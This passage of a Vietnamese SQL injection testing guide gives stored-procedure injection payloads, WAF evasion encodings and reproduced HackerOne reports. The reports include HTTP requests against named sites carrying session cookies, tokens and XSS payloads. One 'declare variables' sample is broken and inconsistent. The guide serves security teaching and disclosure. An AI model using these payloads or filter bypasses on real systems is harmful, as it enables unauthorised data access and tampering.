+Khi sử dụng SQL động trong một thủ tục được lưu trữ, ứng dụng phải làm sạch đúng cách đầu vào của người dùng để loại bỏ nguy cơ chèn mã. Nếu không được làm sạch, người dùng có thể nhập SQL độc hại sẽ được thực thi trong quy trình được lưu trữ.
+
+Xem xét Stored Procedure Injection sau:
+```
+Create procedure user_login @username varchar(20), @passwd varchar(20) 
+As
+Declare @sqlstring varchar(250)
+Set @sqlstring  = ‘
+Select 1 from users
+Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
+exec(@sqlstring)
+Go
+```
+
+User input:
+```
+1 from users; update users set password = 'password'; select *
+```
+
+Automated Exploitation
+
+Hầu hết các tình huống và kỹ thuật được trình bày ở đây có thể được thực hiện một cách tự động bằng cách sử dụng một số công cụ. Trong bài viết này, người kiểm tra có thể tìm thấy thông tin về cách thực hiện kiểm tra tự động bằng [SQLMap](
+https://www.owasp.org/index.php/Automated_Audit_using_SQLMap):
+
+*SQL Injection signature Evasion Techniques*
+
+Các kỹ thuật này được sử dụng để vượt qua các biện pháp phòng thủ như tường lửa ứng dụng Web (WAF) hoặc hệ thống ngăn chặn xâm nhập (IPS). Đồng thời tham khảo https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF
+
+**White Space**
+
+Bỏ khoảng trắng hoặc thêm khoảng trắng sẽ không ảnh hưởng đến câu lệnh SQL. Ví dụ
+```
+or 'a'='a' 
+```
+```
+ or 'a'  =    'a' 
+```
+
+Thêm ký tự đặc biệt như dòng hoặc tab mới sẽ không thay đổi cách thực thi câu lệnh SQL. Ví dụ,
+```
+ 
+or 
+'a'=
+      'a' 
+```
+
+**Null Bytes**
+
+Sử dụng byte rỗng (%00) trước bất kỳ ký tự nào mà bộ lọc đang chặn.
+
+Ví dụ: nếu kẻ tấn công có thể tiêm SQL sau
+```
+' UNION SELECT password FROM Users WHERE username='admin'--
+```
+để thêm Null Byte sẽ là
+```
+%00' UNION SELECT password FROM Users WHERE username='admin'--
+```
+
+**SQL Comments**
+
+Thêm nhận xét nội tuyến SQL cũng có thể giúp câu lệnh SQL hợp lệ và bỏ qua bộ lọc chèn SQL. Lấy ví dụ SQL injection này.
+```
+' UNION SELECT password FROM Users WHERE name='admin'--
+```
+Thêm comment inline SQL sẽ được.
+```
+'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--
+```
+```
+'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--
+```
+
+**URL Encoding**
+
+Sử dụng [mã hóa URL trực tuyến](
+http://meyerweb.com/eric/tools/dencoder/) để mã hóa câu lệnh SQL
+```
+' UNION SELECT password FROM Users WHERE name='admin'--
+```
+Mã hóa URL của câu lệnh SQL injection sẽ là
+```
+%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--
+```
+
+**Character Encoding**
+
+Hàm char() có thể được sử dụng để thay thế English char. Ví dụ: char(114,111,111,116) có nghĩa là root
+```
+' UNION SELECT password FROM Users WHERE name='root'--
+```
+Để áp dụng Char(), câu lệnh SQL injection sẽ là:
+```
+' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--
+``` 
+
+**String Concatenation**
+
+Phép nối phá vỡ các từ khóa SQL và trốn tránh các bộ lọc. Cú pháp nối khác nhau dựa trên công cụ cơ sở dữ liệu. Lấy công cụ MS SQL làm ví dụ:
+```
+select 1
+```
+Câu lệnh SQL đơn giản có thể được thay đổi như bên dưới bằng cách sử dụng phép nối
+```
+EXEC('SEL' + 'ECT 1')
+```
+
+**Hex Encoding**
+
+Kỹ thuật mã hóa hex sử dụng mã hóa thập lục phân để thay thế ký tự câu lệnh SQL gốc. Ví dụ: 'root' có thể được biểu diễn dưới dạng 726F6F74
+```
+Select user from users where name = 'root'
+```
+Câu lệnh SQL bằng cách sử dụng giá trị HEX sẽ là:
+```
+Select user from users where name = 726F6F74
+```
+hoặc
+```
+Select user from users where name = unhex('726F6F74')
+```
+
+**Declare variables**
+
+Khai báo câu lệnh SQL injection thành biến và thực thi nó.
+
+Ví dụ: câu lệnh SQL injection bên dưới
+```
+Union Select password
+```
+Định nghĩa câu lệnh SQL thành biến SQLivar
+```
+; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password'); 
+EXEC(@SQLivar) 
+```
+
+**Biểu thức thay thế của 'or 1 = 1'**
+
+- OR 'SQLi' = 'SQL'+'i'
+- OR 'SQLi' > 'S'
+- or 20 > 1
+- OR 2 between 3 and 1
+- OR 'SQLi' = N'SQLi'
+- 1 and 1 = 1
+- 1 || 1 = 1
+- 1 && 1 = 1
+
+##### Example report
+
+    Union based
+
+Link to report: https://hackerone.com/reports/1046084
+
+**Summary:**
+
+Xin chào,
+Tôi đã tìm thấy SQL Injection Union Based `https://intensedebate.com/commenthistory/$YourSiteId`
+`$YourSiteId` vào url dễ bị SQL Injection.
+
+**Steps to reproduce:**
+
+1. Đăng nhập vào `https://intensedebate.com`
+2. Sau khi tạo trang web của riêng bạn trên `https://intensedebate.com/install` và làm theo tất cả các bước
+3. Bây giờ bạn cần biết id trang web của mình, để có được thì bạn cần truy cập `https://intensedebate.com/user-dashboard` và bạn có thể thấy ở phía bên phải của trang, danh sách trang web của bạn, chọn trang web của bạn và nhấp vào liên kết `Over view`.
+Bạn sẽ được chuyển hướng đến `https://intensedebate.com/dash/$YourSiteId`.
+Bây giờ bạn đã có id trang web của mình, hãy truy cập URL dễ bị tổn thương với id trang web của bạn `https://intensedebate.com/commenthistory/$YourSiteId`.
+Bây giờ Kích hoạt SQL Injection bằng liên kết sau `https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23` (!) Bạn cần thực hiện việc này với id trang web của riêng mình (!)
+Bây giờ bạn có thể thấy `10.1.32-MariaDB` trên trang.
+
+**POC:**
+
+![](img/4-8/sqliPoc.gif)
+
+**Impact:**
+Toàn quyền truy cập cơ sở dữ liệu chứa thông tin người dùng riêng tư và Reflected XSS
+
+
+    Error based
+
+Link to report: https://hackerone.com/reports/761304
+
+**Summary:**
+
+Xin chào, một trong các tham số trong cookie dễ bị tấn công bởi SQL injection. Request bên dưới có tham số `lang` trong cookie. Nếu bạn chèn một dấu ngoặc đơn như `'`. Bạn gặp lỗi SQL syntax. Bằng cách inject thêm 1 dấu `'`, bạn đã loại bỏ lỗi.
+
+**Step to reproduce:**
+
+Tôi đã không cố gắng lọc dữ liệu vì đây là dấu hiệu rõ ràng của SQLi.
+
+```
+ 
+GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
+Host: mtn.com.ye
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
+Upgrade-Insecure-Requests: 1
+ 
+```
+
+**POC:**
+
+![](img/4-8/SQLi.png)
+
+Tôi xin phép được khai thác thêm vấn đề này.
+
+```
+GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
+Host: mtn.com.ye
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
+Upgrade-Insecure-Requests: 1
+```
+
+![](img/4-8/XSS.png)
+
+**Impact:**
+
+Ứng dụng web dễ bị SQL injection, cho phép truy cập dữ liệu
+
+
+
+    Boolean based
+
+Link to report: https://hackerone.com/reports/301257
+
+**Summary:**
+
+@gerben_javado nhận thấy rằng tham số `brids` (là một mảng JSON) dễ bị tấn công bởi SQL boolean.
+
+**Step to reproduce:**
+
+```
+ 
+POST /████.php?res_id={RES_ID} HTTP/1.1
+Host: www.zomato.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: */*
+Accept-Language: nl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID={SESSION_COOKIE};
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+
+action=show_support_breakups&brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]
+ 
+```
+
+**POC:**
+
+Request `MID(0x352e362e33332d6c6f67,1,1)//LIKE//5` (hex == @@version) dẫn đến status code 500 HTTP và `MID(0x352e362e33332d6c6f67,1,1)//LIKE//4` dẫn đến status code 200 HTTP . Cho thấy rằng phiên bản MySQL bắt đầu bằng 5.
+
+**Impact:**
+
+Ứng dụng web bị SQL injection, cho phép truy cập dữ liệu
+
+
+
+
+    Time based
+
+Link to report: https://hackerone.com/reports/1044698
+
+**Summary:**
+
+Xin chào,
+Tôi đã tìm thấy Time based SQL Injection `/js/commentAction/`.
+Khi người dùng muốn gửi/trả lời comment, payload JSON được gửi theo yêu cầu GET.
+
+```
+ 
+GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
+Host: www.intensedebate.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: /
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
+Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
+ 
+```
+
+```
+HTTP Response `15 414 millis`
+```
+
+```
+GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
+Host: www.intensedebate.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: /
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
+Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
+```
+
+```
+HTTP Response `7 660 millis`
+
+Bonus :  the  key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS')>"` and you will see a XSS pop-up
+```
+
+**POC:**
+Time based SQL Injection
+
+![](img/4-8/POC.gif)
+
+XSS
+
+![](img/4-8/Self-XSS.gif)
+
+**Impact:**
+
+Có đầy đủ quyền truy cập cơ sở dữ liệu chứa thông tin riêng tư của người dùng.
+
